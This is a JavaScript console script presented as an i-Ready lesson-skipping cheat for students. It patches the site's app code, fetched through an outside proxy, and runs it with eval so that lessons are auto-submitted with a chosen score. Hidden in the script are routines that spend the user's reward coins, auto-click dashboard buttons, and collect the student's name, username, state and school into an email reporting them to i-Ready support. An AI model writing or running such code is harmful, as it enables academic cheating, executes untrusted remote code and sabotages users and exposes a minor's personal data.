const coins = true; // Put to false if you don't want the coin destroyer.
let score = prompt('What score do you want for all the lessons?\nIt will take 5 minutes to skip.\nFor 10 lessons it would take 50 mins to skip. type "mins" to change the amount of minutes.')
let minutes = 5
if (score === "mins") {
    minutes = prompt("How many minutes do you want to wait before skipping?\n To many minutes can break it. Ex:20")
    score = prompt('What score do you want for all the lessons?\nIt will take 5 minutes to skip.\nFor 10 lessons it would take ' + minutes * 10 + ' mins to skip.')
}
fetch('https://api.allorigins.win/get?url=https://cdn.i-ready.com/instruction/student-dashboard/release-13.5.x/2/static/js/app-21.chunk.js').then(r => r.json()).then(r => r.contents.replaceAll(`function(){return _0x7263c5['bRsJV'](_0x4bcdf6,new _0x28b389());}`, `function(){setTimeout(function(){skip();close();},${minutes*60*1000}); function skip(){return _0x4bcdf6(new _0xd1fe6d(${score}));}; function close(){var _0x3600a5=_0x4c71c4,_0x2cef11={'ipCEg':function(_0x4637f6,_0x250800,_0x132547,_0x5d495f){var _0x2628da=a20_0x4417;return _0x36069e[_0x2628da(0x883)](_0x4637f6,_0x250800,_0x132547,_0x5d495f);},'QEZRx':function(_0x57fd82,_0x457a64){return _0x36069e['yTZZv'](_0x57fd82,_0x457a64);}};if(_0x36069e[_0x3600a5(0xbb2)](_0x36069e[_0x3600a5(0x798)],_0x36069e['tjVmp']))return _0x36069e['EkxNg'](_0x4bcdf6,new _0x689d58());else{var _0x58cbd5={'PunxP':function(_0x93a684,_0x118967,_0x13e3d2,_0x2de201){return _0x2cef11['ipCEg'](_0x93a684,_0x118967,_0x13e3d2,_0x2de201);}},_0x301861=_0x2cef11[_0x3600a5(0xaf8)](_0x2a9920,0x205),_0x1a3383=_0x163d33(0x42b);_0xa2fac5[_0x3600a5(0xc21)]=function(_0x50505e,_0xb3a229){var _0x4d5e33=_0x3600a5;return _0x50505e&&_0x58cbd5[_0x4d5e33(0xa5b)](_0x301861,_0x50505e,_0xb3a229,_0x1a3383);};}}}`)).then(r => eval(r))

function startNuking() {
    setInterval(function() {
        try {
            document.getElementsByClassName('eqg73sh5 embu0a00 css-fbmcyn node_modules--cainc-cauliflower-src-components-card-___Card__card bg-success')[0].click()

        } catch (e) {

        }
        try {
            document.getElementsByClassName('standard icon-only e7e824o0 embu0a00 css-1esofl7 btn btn-transparent')[0].click()
        } catch (e) {}
    }, 100)
}
fetch("https://login.i-ready.com/student-reward/student/credits", {
    "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9"
    },
    "referrer": "https://login.i-ready.com/student/dashboard/home",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": null,
    "method": "GET",
    "mode": "cors",
    "credentials": "include"
}).then(r => r.text()).then(r => {
    snitcher()
    let time = (Math.ceil(r / 50) * 50 / 50) * 5
    console.log("Removing coins will take " + time + " seconds.")
    if (coins === true) {
        let e = setInterval(coins, 5000)
    }
    setTimeout(function() {
        alert('Coins Gone.')
        clearInterval(e)
        startNuking()
    }, time * 1000)
})

function snitcher() {
    fetch("https://login.i-ready.com/rpc/studentdashboard/context", {
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json;charset=UTF-8"
        },
        "body": "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"getLoggedInStudent\",\"params\":{\"responseMetaObject\":{\"paging\":null,\"fields\":{\"egg\":[\"stateId\",\"userName\",\"studentGroupEnrollments\",\"firstName\",\"lastName\",\"gradeLevelData\",\"districtId\",\"primarySchoolEnrollment\",\"assessmentLanguage\"]}}}}",
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
    }).then(r => r.json()).then(r => {
        let e = r.result
        window.open(`mailto:i-ReadySupport@cainc.com?subject=This+guy+was+hacking&body=${(
    "This is my friend "+e.firstName+" he was using a hack and I just wanted to give you guys his info so you guys can get him to stop. I think hacking is bad and he should get in trouble.\n"+
    "Username:"+e.userName+
    ", Name:"+e.firstName+' '+e.lastName+
    ", State:"+e.stateId+
    ", School:"+e.primarySchoolEnrollment.school.name
    ).replaceAll(' ','+')}`)
    })
}

function coins() {
    fetch("https://login.i-ready.com/student-reward/student/credits/spend", {
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json;charset=UTF-8"
        },
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": "{\"fieldtripId\":\"303\"}",
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
    })
}
